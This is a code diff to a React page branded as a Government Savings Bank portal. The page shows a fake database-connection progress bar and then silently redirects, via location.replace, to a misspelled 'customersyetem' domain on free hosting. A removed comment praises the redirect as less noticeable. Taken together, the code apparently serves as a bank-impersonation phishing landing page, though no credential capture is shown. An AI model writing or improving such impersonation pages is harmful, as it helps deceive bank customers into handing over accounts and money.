@@ -1,19 +1,36 @@
-import { useEffect } from 'react'
+import { useEffect, useState } from 'react'
 import './App.css'
 
 function App() {
+  const [status, setStatus] = useState("กำลังเริ่มต้นระบบ...");
+  const [progress, setProgress] = useState(0);
 
   useEffect(() => {
-    // 1. ตั้งเวลาโชว์ความเท่ของ GSB PORTAL สัก 4 วินาที
-    const timer = setTimeout(() => {
-      
-      // 2. ใช้คำสั่ง replace เพื่อ "วาร์ปทับหน้าเดิม" ไม่ให้เด้งแยกหน้า
-      // และเนียนกว่าการใช้ href ปกติ
-      window.location.replace("https://customersyetem.onrender.com"); 
+    const targetUrl = "https://customersyetem.onrender.com";
+    
+    const wakeUpServer = async () => {
+      try {
+        setStatus("กำลังเชื่อมต่อเซิร์ฟเวอร์...");
+        await fetch(targetUrl, { mode: 'no-cors' });
+        
+        setStatus("ระบบพร้อมใช้งาน...");
+        setProgress(100);
 
-    }, 4000);
+        setTimeout(() => {
+          window.location.replace(targetUrl);
+        }, 1000);
+      } catch (error) {
+        setTimeout(wakeUpServer, 3000); 
+      }
+    };
 
-    return () => clearTimeout(timer);
+    wakeUpServer();
+
+    const interval = setInterval(() => {
+      setProgress(prev => (prev < 95 ? prev + 2 : prev));
+    }, 500);
+
+    return () => clearInterval(interval);
   }, []);
 
   return (
@@ -30,15 +47,17 @@ function App() {
 
         <div className="loading-mechanic">
           <div className="progress-track">
+            <div className="progress-fill" style={{ width: `${progress}%` }}></div>
             <div className="progress-glow"></div>
           </div>
+          
           <div className="status-container">
             <span className="live-dot"></span>
-            <p className="status-text">กำลังเชื่อมต่อระบบฐานข้อมูลหลัก...</p>
+            <p className="status-text">{status}</p>
           </div>
         </div>
 
-        <div className="footer-copyright" style={{ marginTop: '40px', color: 'rgba(255,255,255,0.1)', fontSize: '0.6rem', letterSpacing: '2px' }}>
+        <div className="footer-copyright">
             © 2026 GOVERNMENT SAVINGS BANK PORTAL
         </div>
       </div>
